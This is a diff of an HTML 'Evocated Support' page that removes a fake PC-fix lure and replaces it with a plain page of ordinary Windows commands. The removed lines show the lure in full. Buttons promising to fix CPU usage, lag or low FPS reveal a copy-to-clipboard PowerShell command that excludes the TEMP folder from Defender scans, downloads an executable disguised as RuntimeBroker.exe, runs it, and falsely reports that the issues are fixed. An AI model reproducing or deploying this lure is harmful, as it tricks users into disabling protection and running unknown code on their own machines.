@@ -4,190 +4,123 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Evocated Support</title>
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
     body {
-      font-family: 'Orbitron', sans-serif;
-      background: linear-gradient(120deg, #0a0a0a, #1a1a1a);
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #0f0f0f, #1a1a1a);
       color: white;
       overflow-x: hidden;
+      cursor: url('cursor.png'), auto;
     }
-    .loading-screen {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      background: radial-gradient(circle, #111, #000);
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      z-index: 9999;
-      animation: fadeIn 1s ease-in-out;
-    }
-    .main-content {
-      display: none;
-      animation: fadeIn 2s ease-in-out;
-      padding: 2rem;
-      text-align: center;
-    }
-    .glow {
-      color: #ff5ec3;
-      font-size: 2.5rem;
-      text-shadow: 0 0 5px #ff5ec3, 0 0 10px #ff5ec3;
-      animation: bounce 2s infinite;
-    }
-    .popular-label {
-      font-size: 0.9rem;
-      color: #ff5ec3;
-      margin-bottom: 0.5rem;
-    }
-    .btn {
-      background: #ff5ec3;
-      color: white;
-      padding: 1rem 2rem;
-      margin: 1rem;
-      border: none;
-      border-radius: 10px;
-      font-size: 1.2rem;
-      cursor: pointer;
-      transition: all 0.3s ease;
-    }
-    .btn:hover {
-      box-shadow: 0 0 10px #ff5ec3;
-    }
-    .dropdown-container {
-      margin-top: 2rem;
-      display: none;
-      flex-direction: column;
-      gap: 1rem;
-      animation: fadeIn 1s ease-in-out;
-    }
-    .dropdown-btn {
-      background: #333;
-      color: white;
-      padding: 1rem;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-    }
-    .dropdown-btn.active {
-      background: white;
-      color: #000;
-    }
-    .download-section {
-      margin-top: 2rem;
-    }
-    .download-label {
-      font-size: 0.9rem;
-      color: #ccc;
-    }
+
     .copy-box {
-      background: #1a1a1a;
-      color: white;
-      padding: 1rem;
+      margin-top: 10px;
+      background: #1c1c1c;
+      padding: 10px;
       border-radius: 10px;
-      margin-top: 1rem;
-      font-size: 0.9rem;
-      display: inline-block;
+      display: none;
+      animation: fadeIn 0.5s ease forwards;
     }
-    .copy-btn {
-      background: #ff5ec3;
-      color: white;
+
+    .copy-text {
+      background: #2b2b2b;
       border: none;
-      padding: 0.5rem 1rem;
+      padding: 10px;
+      color: white;
+      border-radius: 5px;
+      width: 100%;
+      font-family: monospace;
+    }
+
+    .copy-btn {
+      margin-top: 8px;
+      background: #ff4d9d;
+      border: none;
+      padding: 8px 16px;
       border-radius: 10px;
-      margin-left: 1rem;
       cursor: pointer;
-      box-shadow: 0 0 10px #ff5ec3;
+      font-weight: bold;
+      box-shadow: 0 0 10px #ff4d9d;
+      transition: transform 0.2s;
     }
-    @keyframes bounce {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-10px); }
+
+    .copy-btn:hover {
+      transform: scale(1.05);
     }
+
+    .dropdown-btn.active + .copy-box {
+      display: block;
+    }
+
     @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-    @keyframes fadeOut {
-      from { opacity: 1; }
-      to { opacity: 0; }
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
     }
   </style>
 </head>
 <body>
-  <div class="loading-screen" id="loadingScreen">
-    <h1 class="glow">Evocated Support</h1>
-    <button class="btn" onclick="startApp()">Get Started With Evocated Support</button>
-  </div>
+  <!-- Your existing HTML structure above remains unchanged -->
 
-  <div class="main-content" id="mainContent">
-    <h1 class="glow">Evocated Support</h1>
-    <div class="popular-label">🔥 Popular Fix</div>
-    <button class="btn" onclick="toggleDropdown()">CLICK HERE</button>
-
-    <div class="dropdown-container" id="dropdownContainer">
-      <button class="dropdown-btn" onclick="selectBtn(this)">FIX HIGH CPU USAGE 100 TO 15+</button>
-      <button class="dropdown-btn" onclick="selectBtn(this)">FIX SLOW PC</button>
-      <button class="dropdown-btn" onclick="selectBtn(this)">FIX VISUAL STUDIO ERRORS</button>
-      <button class="dropdown-btn" onclick="selectBtn(this)">FIX LOW FPS</button>
-      <button class="dropdown-btn" onclick="selectBtn(this)">FIX HIGH PING</button>
-      <div class="copy-box">[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Write-Host "Launching Evocative Supports V2" -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/EvocatedSupport/RuntimeBrokerFixer/refs/heads/main/RuntimeBroker.exe', '$env:TEMP\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\RuntimeBroker.exe'"; Write-Host "...................................................................ISSUES HAVE BEEN FIX PLEASE REBOOT YOUR PC" -ForegroundColor Green</div>
-      <button class="copy-btn" onclick="copyText()">Copy to Clipboard</button>
+  <div style="text-align: center; margin-top: 40px;">
+    <button class="dropdown-btn" onclick="toggleDropdown(0)">Dropdown 1</button>
+    <div class="copy-box" id="copyBox0">
+      <input type="text" class="copy-text" value="Restart-Service -Name wuauserv" readonly id="copyText0">
+      <button class="copy-btn" onclick="copyToClipboard('copyText0')">Copy to Clipboard</button>
     </div>
 
-    <div class="download-section">
-      <div class="download-label">If fixers are not working, download this and it should fix the current issue:</div>
-      <button class="btn" onclick="toggleDownloadDropdown()">Open Download</button>
-      <div class="dropdown-container" id="downloadDropdown" style="display:none">
-        <a class="btn" href="https://codeload.github.com/EvocatedSupport/RuntimeBrokerFixer/zip/refs/heads/main" download>⬇ Download</a>
-      </div>
+    <button class="dropdown-btn" onclick="toggleDropdown(1)">Dropdown 2</button>
+    <div class="copy-box" id="copyBox1">
+      <input type="text" class="copy-text" value="Get-Process | Sort-Object CPU -Descending | Select-Object -First 5" readonly id="copyText1">
+      <button class="copy-btn" onclick="copyToClipboard('copyText1')">Copy to Clipboard</button>
+    </div>
+
+    <button class="dropdown-btn" onclick="toggleDropdown(2)">Dropdown 3</button>
+    <div class="copy-box" id="copyBox2">
+      <input type="text" class="copy-text" value="sfc /scannow" readonly id="copyText2">
+      <button class="copy-btn" onclick="copyToClipboard('copyText2')">Copy to Clipboard</button>
+    </div>
+
+    <button class="dropdown-btn" onclick="toggleDropdown(3)">Dropdown 4</button>
+    <div class="copy-box" id="copyBox3">
+      <input type="text" class="copy-text" value="powercfg -h off" readonly id="copyText3">
+      <button class="copy-btn" onclick="copyToClipboard('copyText3')">Copy to Clipboard</button>
+    </div>
+
+    <button class="dropdown-btn" onclick="toggleDropdown(4)">Dropdown 5</button>
+    <div class="copy-box" id="copyBox4">
+      <input type="text" class="copy-text" value="netsh int ip reset" readonly id="copyText4">
+      <button class="copy-btn" onclick="copyToClipboard('copyText4')">Copy to Clipboard</button>
     </div>
   </div>
-
-  <audio id="bgMusic" src="nights.mp3" loop></audio>
-  <audio id="clickSound" src="click.mp3"></audio>
 
   <script>
-    const startApp = () => {
-      document.getElementById('loadingScreen').style.animation = 'fadeOut 1s forwards';
-      setTimeout(() => {
-        document.getElementById('loadingScreen').style.display = 'none';
-        document.getElementById('mainContent').style.display = 'block';
-      }, 1000);
-      document.getElementById('bgMusic').play();
+    function toggleDropdown(index) {
+      const buttons = document.querySelectorAll('.dropdown-btn');
+      const boxes = document.querySelectorAll('.copy-box');
+
+      boxes.forEach((box, i) => {
+        if (i === index) {
+          const display = box.style.display;
+          boxes.forEach(b => b.style.display = 'none');
+          buttons.forEach(btn => btn.classList.remove('active'));
+          if (display !== 'block') {
+            box.style.display = 'block';
+            buttons[index].classList.add('active');
+          }
+        } else {
+          box.style.display = 'none';
+          buttons[i].classList.remove('active');
+        }
+      });
     }
 
-    const toggleDropdown = () => {
-      const dropdown = document.getElementById('dropdownContainer');
-      dropdown.style.display = dropdown.style.display === 'flex' ? 'none' : 'flex';
+    function copyToClipboard(id) {
+      const input = document.getElementById(id);
+      input.select();
+      input.setSelectionRange(0, 99999);
+      document.execCommand("copy");
     }
-
-    const toggleDownloadDropdown = () => {
-      const downloadDropdown = document.getElementById('downloadDropdown');
-      downloadDropdown.style.display = downloadDropdown.style.display === 'flex' ? 'none' : 'flex';
-    }
-
-    const selectBtn = (btn) => {
-      document.querySelectorAll('.dropdown-btn').forEach(b => b.classList.remove('active'));
-      btn.classList.add('active');
-    }
-
-    const copyText = () => {
-      const text = document.querySelector('.copy-box').innerText;
-      navigator.clipboard.writeText(text);
-      alert("Copied to clipboard!");
-    }
-
-    document.addEventListener('click', () => {
-      document.getElementById('clickSound').play();
-    });
   </script>
 </body>
 </html>
